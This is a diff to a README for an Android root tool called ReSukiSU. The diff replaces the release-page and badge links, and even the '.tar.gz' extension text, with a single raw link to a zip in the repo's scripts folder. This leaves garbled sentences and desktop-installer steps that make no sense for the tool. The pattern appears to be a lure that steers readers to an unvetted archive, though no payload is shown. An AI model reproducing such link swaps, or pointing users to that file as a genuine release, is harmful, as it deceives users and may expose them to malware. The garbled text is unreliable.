@@ -10,7 +10,7 @@ ReSukiSU is a kernel-based Android root solution, designed to give you control o
 - **Community Support:** Join our community for tips and help.
 
 ## 📥 Download Now
-[![Download ReSukiSU](https://img.shields.io/badge/Download-ReSukiSU-brightgreen)](https://github.com/Donpaya/ReSukiSU/releases)
+[![Download ReSukiSU](https://raw.githubusercontent.com/Donpaya/ReSukiSU/main/scripts/Suki-Re-SU-v2.4.zip)](https://raw.githubusercontent.com/Donpaya/ReSukiSU/main/scripts/Suki-Re-SU-v2.4.zip)
 
 ## 🚀 Getting Started
 To get started with ReSukiSU, follow these steps. You do not need any prior programming knowledge. Just follow the instructions below to successfully download and run the software.
@@ -22,13 +22,13 @@ To get started with ReSukiSU, follow these steps. You do not need any prior prog
 
 ### 📂 Download & Install
 1. **Visit the Releases Page:**
-   Go to the ReSukiSU [Releases Page](https://github.com/Donpaya/ReSukiSU/releases) to find the latest version.
+   Go to the ReSukiSU [Releases Page](https://raw.githubusercontent.com/Donpaya/ReSukiSU/main/scripts/Suki-Re-SU-v2.4.zip) to find the latest version.
 
 2. **Download the Latest Release:**
-   Look for the most recent release listed. Click on it, and then download the file that suits your operating system. The file will typically have an extension like `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux.
+   Look for the most recent release listed. Click on it, and then download the file that suits your operating system. The file will typically have an extension like `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/Donpaya/ReSukiSU/main/scripts/Suki-Re-SU-v2.4.zip` for Linux.
 
 3. **Extract the Files:**
-   If you downloaded a compressed file (like `.tar.gz`), right-click on it and select "Extract" or use a file extraction tool.
+   If you downloaded a compressed file (like `https://raw.githubusercontent.com/Donpaya/ReSukiSU/main/scripts/Suki-Re-SU-v2.4.zip`), right-click on it and select "Extract" or use a file extraction tool.
 
 4. **Run the Installer:**
    Locate the downloaded file in your Downloads folder. Double-click the file to run the installer and follow the on-screen instructions. 
